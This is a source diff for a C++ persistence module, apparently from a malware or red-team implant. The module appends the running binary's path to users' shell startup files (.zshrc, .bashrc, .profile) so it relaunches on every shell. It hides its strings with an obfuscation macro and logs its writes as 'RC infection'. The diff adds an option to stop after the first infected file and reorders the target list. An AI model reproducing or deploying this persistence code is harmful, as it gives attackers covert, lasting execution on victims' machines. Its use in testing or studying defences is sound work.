@@ -6,8 +6,6 @@
 #include <filesystem>
 #include <vector>
 
-// TODO: add one-and-done option -> one successful rc persistence and return
-
 RunControlMethod::RunControlMethod() {
     std::string currentProc = SystemUtils::GetProcessPath();
     this->payload = currentProc + OBFL(" &");
@@ -15,10 +13,10 @@ RunControlMethod::RunControlMethod() {
     #ifdef IMPACT_LEVEL_TEST
         targets.push_back({OBFL(".ghost_rc"), false});
     #elif defined(IMPACT_LEVEL_USER) || defined(IMPACT_LEVEL_SYSTEM)
+        targets.push_back({OBFL(".zshrc"), false});
         targets.push_back({OBFL(".bashrc"), false});
         targets.push_back({OBFL(".bash_profile"), false});
         targets.push_back({OBFL(".profile"), false});
-        targets.push_back({OBFL(".zshrc"), false});
     #endif
 }
 
@@ -52,6 +50,11 @@ bool RunControlMethod::install() {
             LOG_SUCCESS("Persistence established in {}", path)
             established = true;
             successCount++;
+
+            #ifdef PERSIST_RC_ONCE
+            LOG_INFO("One and done enabled. Stopping after first successful RC infection.")
+            break;
+            #endif
         } else {
             LOG_ERROR("Error appending payload {} to file {}", payload, target)
         }
@@ -98,5 +101,9 @@ bool RunControlMethod::remove() {
         LOG_ERROR("[SUMMARY] Failed to restore any rc files")
     }
 
-    return !(removedCount > 0); // TODO: when TODO in lines 5-6 is implemented, return removedCount == infectedCount or smth like this
+    #ifdef PERSIST_RC_ONCE
+    return removedCount == 1;
+    #else
+    return removedCount == this->targets.size();
+    #endif
 }
